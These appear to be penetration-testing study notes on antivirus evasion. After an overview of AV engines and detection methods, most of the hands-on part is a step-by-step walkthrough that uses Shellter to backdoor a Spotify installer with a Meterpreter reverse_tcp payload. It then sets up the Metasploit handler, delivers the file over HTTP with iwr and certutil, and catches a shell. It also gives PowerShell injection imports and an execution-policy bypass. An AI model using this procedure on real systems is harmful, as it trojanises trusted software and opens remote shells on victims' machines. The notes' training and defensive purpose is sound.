# Antivirus Evasion

## Overview

Antivirus evasion is the process of avoiding detection by security products such as AV, EDR, and endpoint protection tools.

As penetration testers, we need to understand how these controls work so we can safely demonstrate realistic attack paths during authorised assessments.

---

## Key AV Concepts

Antivirus software is designed to:

- prevent malware execution
- detect malicious files or behaviour
- quarantine or remove threats
- inspect files, memory, network traffic, and browser activity

Modern AV products often include:

- file scanning
- memory scanning
- network inspection
- sandboxing/emulation
- browser protection
- machine learning
- cloud-based reputation checks

---

## Known vs Unknown Threats

Traditional AV relied heavily on **signatures**.

A signature is a pattern that identifies known malware, such as:

- file hash
- byte sequence
- suspicious string
- network indicator
- behavioural pattern

Example:

```bash
sha256sum malware.txt
```

If one bit of a file changes, the hash changes completely.

This makes simple hash-based detection fragile.

---

## Example: Hash Changes After Small File Change

Original file:

```bash
echo "offsec" > malware.txt
xxd -b malware.txt
sha256sum malware.txt
```

Modified file:

```bash
echo "offseC" > malware.txt
xxd -b malware.txt
sha256sum malware.txt
```

Even changing `c` to `C` produces a completely different hash.

---

## AV Components

Modern antivirus products usually contain multiple engines:

| Component | Purpose |
|---|---|
| File Engine | Scans files on disk |
| Memory Engine | Inspects running process memory |
| Network Engine | Inspects inbound/outbound traffic |
| Disassembler | Converts machine code to assembly for analysis |
| Emulator / Sandbox | Executes suspicious code safely |
| Browser Plugin | Detects browser-based malicious content |
| Machine Learning Engine | Detects unknown or suspicious samples |

---

## File Engine

The file engine scans files using:

- scheduled scans
- real-time scans
- file metadata
- signatures
- hashes
- suspicious byte patterns

Real-time scanning usually relies on kernel-level drivers to monitor file activity.

---

## Memory Engine

The memory engine inspects process memory at runtime.

It may look for:

- known shellcode
- injected payloads
- suspicious API calls
- abnormal process behaviour
- memory regions with unusual permissions

---

## Network Engine

The network engine inspects traffic for indicators such as:

- C2 callbacks
- suspicious domains
- known malware traffic
- exploit payloads
- unusual outbound connections

---

## Disassembler and Sandbox

Malware often hides itself using:

- packing
- encryption
- obfuscation
- runtime decoding

To counter this, AV products may:

- disassemble code
- unpack suspicious binaries
- emulate execution
- inspect behaviour in a sandbox

---

## Detection Methods

Common AV detection methods include:

| Method | Description |
|---|---|
| Signature-based | Detects known malware patterns |
| Heuristic-based | Detects suspicious code structure or logic |
| Behaviour-based | Detects suspicious runtime behaviour |
| Machine learning | Detects unknown threats using models and metadata |

---

## Signature-Based Detection

Signature detection looks for known bad patterns.

Examples:

- exact file hash
- known string
- known byte pattern
- known shellcode sequence

Weakness:

- small changes can alter the signature
- easy to bypass if detection is too specific

---

## Heuristic-Based Detection

Heuristics detect suspicious traits rather than exact signatures.

Examples:

- suspicious API calls
- encoded payloads
- self-modifying code
- unusual control flow
- embedded shellcode

---

## Behaviour-Based Detection

Behaviour-based detection monitors what a program does when executed.

Examples:

- spawning shells
- injecting into another process
- modifying registry autoruns
- dumping credentials
- contacting suspicious hosts
- disabling security tools

---

## Machine Learning Detection

ML detection uses models to classify unknown files or behaviours.

It may consider:

- file metadata
- strings
- imports
- entropy
- behaviour
- reputation
- similarity to known malware

Cloud-based ML can be powerful, but it often requires internet connectivity and sample submission.

---

## AV vs EDR

AV focuses mainly on prevention and detection.

EDR focuses on telemetry, investigation, and response.

| Technology | Main Purpose |
|---|---|
| AV | Detect and block malware |
| EDR | Collect telemetry and support investigation |
| SIEM | Correlate events across the estate |

AV and EDR are often deployed together.

---

## VirusTotal Warning

VirusTotal is useful for checking detection rates, but it shares samples with participating vendors.

Do **not** upload sensitive payloads, client-specific tooling, or engagement payloads to VirusTotal.

Use a local lab or isolated test VM where possible.

---

# Bypassing Antivirus Detections

AV evasion usually falls into two categories:

| Type | Description |
|---|---|
| On-disk evasion | Modify files stored on disk |
| In-memory evasion | Avoid writing malicious files to disk |

---

## On-Disk Evasion

On-disk evasion focuses on changing the physical file.

Common approaches include:

- packing
- obfuscation
- encryption
- crypters
- software protectors

---

## Packers

Packers compress or transform an executable while keeping it functional.

Originally, they were used to reduce file size.

From an evasion perspective, packing changes the file structure and hash.

Examples:

- UPX
- commercial software protectors
- custom packers

Modern AV often detects common packers, so packing alone is usually not enough.

---

## Obfuscators

Obfuscators make code harder to analyse.

They may:

- rename variables
- reorder functions
- insert dead code
- replace instructions with equivalent ones
- split logic across multiple functions

This may reduce simple static detections but is not reliable against modern AV/EDR.

---

## Crypters

Crypters encrypt the payload and include a small decryption stub.

The encrypted payload exists on disk.

At runtime:

```text
Encrypted payload
→ decryption stub runs
→ payload is decrypted in memory
→ payload executes
```

This can bypass some static detection but may still be caught by behavioural or memory scanning.

---

## In-Memory Evasion

In-memory evasion avoids writing the final payload to disk.

Common techniques include:

- process injection
- reflective DLL injection
- process hollowing
- inline hooking
- PowerShell/.NET memory execution

---

## Remote Process Memory Injection

A common process injection flow:

```text
Open target process
→ allocate memory
→ write payload into memory
→ create remote thread
→ payload executes inside target process
```

Common Windows APIs involved:

- `OpenProcess`
- `VirtualAllocEx`
- `WriteProcessMemory`
- `CreateRemoteThread`

---

## Reflective DLL Injection

Reflective DLL injection loads a DLL directly from memory rather than disk.

Normal DLL loading uses:

```text
LoadLibrary()
```

Reflective loading requires custom logic because Windows does not natively expose a simple API for loading a DLL directly from memory.

---

## Process Hollowing

Process hollowing works by:

```text
Start legitimate process suspended
→ remove its original memory image
→ replace it with malicious code
→ resume process
```

To defenders, the process may appear legitimate while executing different code.

---

## Inline Hooking

Inline hooking modifies code in memory so that execution is redirected.

This is often associated with:

- rootkits
- stealth malware
- persistence mechanisms
- monitoring or tampering with API calls

---

# AV Evasion Testing Considerations

When testing AV evasion during an authorised assessment:

- avoid uploading payloads to public scanners
- test against a local copy of the target AV if possible
- disable automatic sample submission in test labs
- match the client environment closely
- prefer custom tooling over public payloads
- document exactly what was tested

---

## Disable Sample Submission in Test Labs

For Windows Defender:

```text
Windows Security
→ Virus & threat protection
→ Manage settings
→ Automatic sample submission
→ Off
```

This prevents samples from being automatically uploaded for cloud analysis during lab testing.

---

## Custom Code Principle

Public payloads are heavily signatured.

Custom code is usually harder to detect because it is less likely to match known signatures.

General rule:

```text
More public/common payload = more likely to be detected
More custom/unique payload = less likely to match signatures
```

---

# PowerShell In-Memory Injection Concept

PowerShell can interact with Windows APIs.

A basic in-memory injection script may import functions such as:

```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(
    IntPtr lpAddress,
    uint dwSize,
    uint flAllocationType,
    uint flProtect
);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(
    IntPtr lpThreadAttributes,
    uint dwStackSize,
    IntPtr lpStartAddress,
    IntPtr lpParameter,
    uint dwCreationFlags,
    IntPtr lpThreadId
);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(
    IntPtr dest,
    uint src,
    uint count
);';
```

These functions allow the script to:

- allocate memory
- copy data into memory
- create a thread
- execute code inside the current process

---

## PowerShell Execution Policy

A common issue when running PowerShell scripts:

```powershell
.\bypass.ps1
```

Error:

```text
File cannot be loaded because running scripts is disabled on this system.
```

Check current user policy:

```powershell
Get-ExecutionPolicy -Scope CurrentUser
```

Set current user policy:

```powershell
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```

Alternative per-command bypass:

```powershell
powershell.exe -ExecutionPolicy Bypass -File .\script.ps1
```

---

## Architecture Matters

If the payload is x86, run it in x86 PowerShell.

Common path:

```text
Windows PowerShell (x86)
```

Mismatch example:

```text
x86 payload + x64 PowerShell = likely failure
```

---

# Shellter Overview

Shellter is a dynamic shellcode injection tool.

It can inject payloads into legitimate Windows PE files.

General concept:

```text
Legitimate PE
→ Shellter analyses execution flow
→ payload inserted into suitable location
→ PE still appears to run normally
→ payload executes during runtime
```

---

## Installing Shellter

```bash
sudo apt update
sudo apt install shellter
```

Shellter runs through Wine on Kali.

Install Wine:

```bash
sudo apt install wine
sudo dpkg --add-architecture i386
sudo apt update
sudo apt install wine32
```

---

## Shellter Modes

| Mode | Description |
|---|---|
| Auto | Shellter chooses injection options automatically |
| Manual | Operator controls more of the injection process |

Auto mode is usually easier for quick testing.

---

## Shellter Stealth Mode

Stealth Mode attempts to return execution flow to the original program after the payload runs.

This helps the backdoored program appear normal to the user.

---

## Payload Handler Example

If using a Meterpreter payload, configure a handler:

```bash
msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <ATTACKER_IP>; set LPORT 443; run;"
```

---

## Confirming Access

Once the payload runs, verify the session:

```text
meterpreter > shell
```

Then check user context:

```cmd
whoami
hostname
```

---
# Shellter Walkthrough Example
## Step 1 – Install Shellter

Search for Shellter in the Kali repositories:

```
apt-cache search shellter
```

Expected result:

```
shellter - Dynamic shellcode injection tool and dynamic PE infector
```

Install Shellter:

```
sudo apt install shellter
```

---

## Step 2 – Install Wine

Shellter is a Windows application, so Kali needs Wine to run it.

Install Wine:

```
sudo apt install wine
```

Add 32-bit architecture support:

```
sudo dpkg --add-architecture i386sudo apt-get updatesudo apt-get install wine32
```

### ARM-Based Kali Systems

If using Kali on an ARM processor, use:

```
sudo apt install winesudo dpkg --add-architecture amd64sudo apt install -y qemu-user-static binfmt-supportsudo apt-get updatesudo apt-get install wine32
```

---

## Step 3 – Prepare the Target Executable

In this example, the target executable is a 32-bit Spotify installer:

```
/home/kali/Downloads/SpotifyFullWin10-32bit.exe
```

Shellter works best with 32-bit Windows PE files.

### Choosing a Good Target PE

For real engagements, avoid very common or heavily analysed executables.

Better candidates are usually:

- Lesser-known utilities
- Client-specific internal tools
- Small 32-bit Windows applications
- Recently compiled binaries
- Software unlikely to be heavily signatured by AV vendors

Avoid:

- Extremely popular installers
- Packed or protected executables
- Files that crash when modified
- Applications that require admin rights unless that is intentional
- Executables that immediately trigger reputation-based alerts

---

## Step 4 – Launch Shellter

Start Shellter from Kali:

```
shellter
```

Shellter should open inside a Wine console.

---

## Step 5 – Select Auto Mode

Shellter can run in two modes:

|Mode|Description|
|---|---|
|Auto|Shellter automatically selects injection options|
|Manual|Gives more control over the injection process|

For this example, choose Auto mode:

```
A
```

Auto mode is usually the best starting point.

Use Manual mode if:

- Auto mode fails
- The backdoored executable crashes
- The payload does not execute
- You need more control over the injection point
- You are testing different evasion paths

---

## Step 6 – Provide the Target PE Path

When prompted, enter the full path to the executable:

```
/home/kali/Downloads/SpotifyFullWin10-32bit.exe
```

Shellter will analyse the executable and create a backup before modifying it.

This is useful because you can restore the original file if the injection fails or the executable becomes unstable.

---

## Step 7 – Enable Stealth Mode

Shellter will ask whether to enable Stealth Mode.

Select:

```
Y
```

### What Stealth Mode Does

Stealth Mode attempts to restore the original execution flow after the payload runs.

In simple terms:

```
Payload executes        ↓Control returns to the original program        ↓Program continues normally
```

This is useful because the target application still appears to behave as expected.

Without Stealth Mode, the user may notice that the executable crashes or does nothing.

---

## Step 8 – Select the Payload Type

Shellter allows two broad payload options:

|Option|Meaning|
|---|---|
|Listed payloads|Built-in payload options|
|Custom payload|User-supplied shellcode|

For this example, choose listed payloads:

```
L
```

Then select:

```
1
```

This selects the first listed payload, which in this example is:

```
windows/meterpreter/reverse_tcp
```

---

## Step 9 – Configure Payload Options

Shellter will ask for the payload options.

Set `LHOST` to your Kali IP address:

```
192.168.50.1
```

Set `LPORT` to your chosen listener port:

```
443
```

Example values:

|Option|Value|
|---|---|
|LHOST|`192.168.50.1`|
|LPORT|`443`|

### Why Port 443?

Port `443` is commonly allowed outbound because it is used for HTTPS traffic.

In real environments, outbound firewall restrictions may block unusual ports, so using commonly permitted ports can increase the chance of callback success.

However, defenders may still detect the connection through:

- TLS inspection
- Proxy logs
- EDR telemetry
- Suspicious destination analysis
- Non-HTTPS traffic on port 443

---

## Step 10 – Let Shellter Inject the Payload

After setting the options, Shellter will inject the payload into the target executable.

It will then attempt to verify that the injection was successful by reaching the first instruction of the payload.

If successful, the original executable has now been backdoored.

The modified file remains at the original path:

```
/home/kali/Downloads/SpotifyFullWin10-32bit.exe
```

Shellter should also have created a backup of the original executable.

---

## Step 11 – Start the Metasploit Handler

Before executing the payload on the Windows target, start a listener on Kali.

Use:

```
msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.50.1; set LPORT 443; run;"
```

Expected output:

```
payload => windows/meterpreter/reverse_tcpLHOST => 192.168.50.1LPORT => 443[*] Started reverse TCP handler on 192.168.50.1:443
```

### Cleaner Multi-Line Metasploit Setup

Alternatively, launch Metasploit normally:

```
msfconsole
```

Then configure the handler manually:

```
use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset LHOST 192.168.50.1set LPORT 443run
```

---

## Step 12 – Transfer the Backdoored Executable

Transfer the modified executable to the Windows target.

Common transfer methods include:

- Python HTTP server
- SMB share
- SCP
- RDP clipboard
- Web upload functionality
- Phishing simulation delivery
- Client-approved payload delivery path

Example Python HTTP server from Kali:

```
cd /home/kali/Downloadspython3 -m http.server 8000
```

Download from the Windows target:

```
iwr http://192.168.50.1:8000/SpotifyFullWin10-32bit.exe -OutFile SpotifyFullWin10-32bit.exe
```

Or using `certutil`:

```
certutil -urlcache -f http://192.168.50.1:8000/SpotifyFullWin10-32bit.exe SpotifyFullWin10-32bit.exe
```

---

## Step 13 – Execute the Payload on the Target

On the Windows target, execute:

```
SpotifyFullWin10-32bit.exe
```

The legitimate application should launch as normal.

In this example, the Spotify installer opens, but because the lab VM has no internet access, the installer hangs while trying to download the Spotify package.

Behind the scenes, the injected Meterpreter payload should execute and connect back to Kali.

---

## Step 14 – Catch the Meterpreter Session

Check the Metasploit handler on Kali.

Successful output should look similar to:

```
[*] Sending stage (175174 bytes) to 192.168.50.62[*] Meterpreter session 1 opened (192.168.50.1:443 -> 192.168.50.62:52273)
```

Interact with the session:

```
sessionssessions -i 1
```

Drop into a Windows shell:

```
shell
```

Verify access:

```
whoami
```

Example result:

```
client01\offsec
```

---
# Common AV Evasion Issues

## Payload is detected on disk
Possible causes:

- known payload
- public shellcode
- common packer
- obvious strings
- known file hash

## Script is blocked
Possible causes:

- PowerShell execution policy
- AMSI
- Defender
- EDR
- blocked interpreter
- AppLocker / WDAC

## Payload executes but no shell
Possible causes:

- wrong LHOST
- wrong LPORT
- firewall blocking callback
- wrong architecture
- listener not running
- payload crashed
- NAT/routing issue

## Works in lab but fails on target
Possible causes:

- different AV/EDR
- cloud protection enabled
- sample submission enabled
- stricter PowerShell policy
- AppLocker
- no internet
- proxy restrictions
- EDR alerting silently

---

# Quick AV Evasion Workflow

```text
Identify target AV/EDR
→ Build matching lab VM
→ Disable sample submission in lab
→ Test basic payload detection
→ Determine detection point
→ Modify payload/tooling
→ Retest locally
→ Avoid public scanners
→ Execute only in authorised scope
→ Document detection and bypass behaviour
```

---

# Defensive Notes

Good defensive controls include:

- EDR telemetry
- PowerShell logging
- AMSI
- script block logging
- command line logging
- cloud protection
- sample submission
- application control
- least privilege
- network egress filtering
- user awareness
- alerting on suspicious process injection

---

## Detection Ideas

Look for:

- PowerShell spawning unusual child processes
- encoded PowerShell commands
- suspicious memory allocation
- unsigned scripts
- unexpected outbound connections
- unusual parent-child process relationships
- PE files modified from known installers
- abnormal use of Windows APIs
- Meterpreter-like network patterns

---

# Quick Command Reference

## Install Shellter

```
sudo apt install shellter
```

## Install Wine

```
sudo apt install winesudo dpkg --add-architecture i386sudo apt-get updatesudo apt-get install wine32
```

## Launch Shellter

```
shellter
```

## Start Metasploit Handler

```
msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.50.1; set LPORT 443; run;"
```

## Host Payload for Download

```
cd /home/kali/Downloadspython3 -m http.server 8000
```

## Download Payload on Windows with PowerShell

```
iwr http://192.168.50.1:8000/SpotifyFullWin10-32bit.exe -OutFile SpotifyFullWin10-32bit.exe
```

## Download Payload on Windows with Certutil

```
certutil -urlcache -f http://192.168.50.1:8000/SpotifyFullWin10-32bit.exe SpotifyFullWin10-32bit.exe
```

## Verify User Context

```
whoami
```

---

# Key Takeaways

- AV is not just file scanning; modern products inspect files, memory, network traffic, and behaviour.
- Signature-based detection is easy to understand but weak on its own.
- Heuristic, behavioural, and ML detections make evasion harder.
- Public payloads are usually heavily detected.
- In-memory execution reduces on-disk detection but may still trigger EDR.
- VirusTotal can burn payloads by sharing samples with vendors.
- Testing should be done in a controlled lab that mirrors the target environment.
- Evasion success is usually specific to the target AV, configuration, and environment.

#antivirus #av-evasion #edr #powershell #shellter #metasploit #payloads #red-team #oscp